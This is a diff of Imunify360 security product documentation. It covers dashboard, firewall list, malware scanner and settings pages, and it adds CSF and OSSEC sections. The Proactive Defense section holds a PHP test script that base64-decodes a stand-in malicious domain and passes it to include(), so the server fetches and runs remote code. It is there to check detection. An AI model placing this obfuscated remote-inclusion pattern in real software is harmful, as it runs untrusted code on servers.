@@ -57,12 +57,14 @@ You can access the Imunify360 Dashboard from your control panel. It shows securi
 It's a great way to analyze incidents that happened within the past day, week or month.
 
 :::tip Note
-Beta 4.0
+Beta 4.0 and later
 :::
 
 Click <span class="notranslate">_Dashboard_</span> tab to display an overview of incidents recorded during the selected time interval, an estimate of the intensity of attacks, and correlate events across all sources.
 
-![](/images/DashboardGeneral1.png)
+![](/images/DashboardGeneral2.png)
+
+Here you can see notifications about server security and Imunify360 configuration, along with recommendations for making server security effective and proactive.
 
 <div class="notranslate">
 
@@ -71,7 +73,7 @@ Click <span class="notranslate">_Dashboard_</span> tab to display an overview of
 </div>
 
 :::tip Note
-Beta 4.1
+Beta 4.1 and later
 :::
 
 Starting from Imunify360 version 4.1, the <span class="notranslate">Dashboard</span> can display Imunify360 performance data for a number of specified servers. 
@@ -83,7 +85,7 @@ Starting from Imunify360 version 4.1, the <span class="notranslate">Dashboard</s
 * You can easily remove a server from the Dashboard.
 * You can use <span class="notranslate">_Server_</span> drop-down to show a list of all servers added into the Dashboard.
 
-![](/images/dashboard_servers1.png)
+![](/images/dashboard_servers2.png)
 
 
 #### **How to get a server key**
@@ -232,7 +234,7 @@ Click an incident to expand the detailed information.
 
 ![](/images/move_button_zoom94.png)
 
-## Lists
+## Firewall
 
 
 <span class="notranslate">_Lists_</span> tab allows viewing and managing the IP addresses in the lists:
@@ -247,7 +249,7 @@ Click an incident to expand the detailed information.
 Click <span class="notranslate">_Lists_</span> in the main menu then choose <span class="notranslate">_White List_</span>.
 
 
-![](/images/WhiteList.png)
+![](/images/WhiteList1.png)
 
 Use filters to show the exact list of the IPs:
 
@@ -326,7 +328,7 @@ Imunify360 has predefined whitelisted services. The actual list is always availa
 
 Choose <span class="notranslate">_Lists_</span> tab in the main menu then click <span class="notranslate">_Gray List_</span>.
 
-![](/images/Gray_List.png)
+![](/images/Gray_List1.png)
 
 Use filters to show the exact list of the IPs:
 
@@ -388,7 +390,7 @@ You will see a notification if the IP is removed successfully.
 
 Choose <span class="notranslate">_Lists_</span> tab in the main menu then click <span class="notranslate">_Black List_</span>.
 
-![](/images/Black_List.png)
+![](/images/Black_List1.png)
 
 Use filters to show the exact list of the IPs:
 
@@ -488,7 +490,7 @@ This feature allows to block specific ports for TCP/UDP connection. It is also p
 
 Click <span class="notranslate">_Lists_</span> and choose <span class="notranslate">_Blocked Ports_</span>.
 
-![](/images/Blocked_Ports.png)
+![](/images/Blocked_Ports1.png)
 
 ::: tip Note
 If CSF integration enabled, then <span class="notranslate">Blocked Ports</span> will be disabled. Imunify360 imports Closed ports and their whitelisted IPs from CSF.
@@ -679,15 +681,15 @@ It is possible to scan a specific directory for malware. Go to <span class="notr
 
    * <span class="notranslate">_Filename mask_</span>. It allows to set file type for scanning (for example, `*.php` – all the files with extension php). Default setting is `*` which means all files without restriction.
    * <span class="notranslate">_Ignore mask_</span>. It allows to set file type to ignore (for example, `*.html` – will ignore all file with extension html).
-   * <span class="notranslate">_Intensity_</span>. Defines the priority and resources consumption for scanning without decreasing efficiency:
-	     * <span class="notranslate">Low</span> – low priority and resources consumption
-	     * <span class="notranslate">Moderate</span> – moderate priority and resources consumption
-	     * <span class="notranslate">High</span> – high priority and resources consumption
+   * <span class="notranslate">_CPU consumption_</span>. Defines the CPU consumption for scanning without decreasing efficiency:
+	     * from <span class="notranslate">Low</span> to <span class="notranslate">High</span>.
+   * <span class="notranslate">_I/O consumption_</span>. Defines the I/O consumption for scanning without decreasing efficiency:
+	     * from <span class="notranslate">Low</span> to <span class="notranslate">High</span>.
 	* <span class="notranslate">_Follow symlinks<sup> 3.9.0+</sup>_</span>. Follow all symlinks within the folder to scan. 
 
-![](/images/malwarescannerondemandscan_zoom70.png)
+![](/images/malware_scanner.png)
 
-2. Click <span class="notranslate">_Start_</span>.
+1. Click <span class="notranslate">_Start_</span>.
 
 At the top right corner Malware Scanner progress and status are displayed:
 * <span class="notranslate">Scanner is stopped</span> – means that there is no scanning process running.
@@ -921,26 +923,28 @@ The <span class="notranslate">_Ignore List_</span> table includes the following 
 ``` PHP
 <?php
 /* Imunify360 Proactive Defence test script */
+
 echo "<pre>";
 echo "Step 1<br>";
+
 // Decode string with domain: 37kddsserrt.xyz
 $url=base64_decode("MzdrZGRzc2VycnQueHl6");
-
-// Try to access a malicious domain
-include($url);
 
 echo "Step 2<br>";
 echo "</pre>";
 
+// Try to access a malicious domain
+include($url);
+die();
 ?>
 ```
 </div>
 
-1. Place this file on the server.
-2. Call a test page with the script from the point 2.
-3. If <span class="notranslate">Proactive Defense</span> is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
-4. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the <span class="notranslate">_Detected Events_</span> table.
-5. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.
+3. Place this file on the server.
+4. Call a test page with the script from the point 2.
+5. If <span class="notranslate">Proactive Defense</span> is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
+6. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the <span class="notranslate">_Detected Events_</span> table.
+7. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.
 
 ## Reputation Management
 
@@ -1024,9 +1028,11 @@ Go to <span class="notranslate">_Imunify360 → Settings → General_</span>. Th
 
 * <span class="notranslate">[Installation](/dashboard/#installation)</span>
 * <span class="notranslate">[DoS Protection](/dashboard/#dos-protection)</span>
+* <span class="notranslate">[3-rd Party Integration](/dashboard/#_3-rd-party-integration)</span>
 * <span class="notranslate">[Auto White List](/dashboard/#auto-white-list)</span>
 * <span class="notranslate">[Incidents Logging](/dashboard/#incidents-logging)</span>
 * <span class="notranslate">[WebShield](/dashboard/#webshield)</span>
+* <span class="notranslate">[OSSEC](/dashboard/#ossec)</span>
 * <span class="notranslate">[Error Reporting](/dashboard/#error-reporting)</span>
 * <span class="notranslate">[Contact Details](/dashboard/#contact-details)</span>
 
@@ -1100,6 +1106,12 @@ It is possible to configure how Imunify360 will behave:
 
 Click <span class="notranslate">_Save changes_</span> button on the bottom of the section to save changes.
 
+#### 3-rd Party Integration
+
+Tick the <span class="notranslate">_Manage CSF Events and Lists_</span> checkbox to enable/disable the integration between CSF and Imunify360.
+	
+![](/images/3rd_party_protection.png)
+
 #### Auto White List
  
 <span class="notranslate">Auto White List</span> section allows to automatically add admin IP to the <span class="notranslate">White List</span> each time when he logs in to hosting panel and enters Imunify360 user interface.
@@ -1154,6 +1166,15 @@ Click <span class="notranslate">_Save changes_</span> button on the bottom of th
 Tick <span class="notranslate">_Detect IPs behind CDN_</span> checkbox to allow to recognize and block IPs with suspicious activity behind Cloudflare and MaxCDN.
 	
 ![](/images/webshield.png)
+
+Click <span class="notranslate">_Save changes_</span> button on the bottom of the section to save changes.
+
+#### OSSEC
+
+Tick the <span class="notranslate">_Active response_</span> checkbox to block access to a specific server port being attacked. 
+The purpose of the feature is significantly reducing false positive rate while increasing its capabilities to detect and block aggressive brute force requests.
+	
+![](/images/ossec_tick.png)
 
 Click <span class="notranslate">_Save changes_</span> button on the bottom of the section to save changes.
 
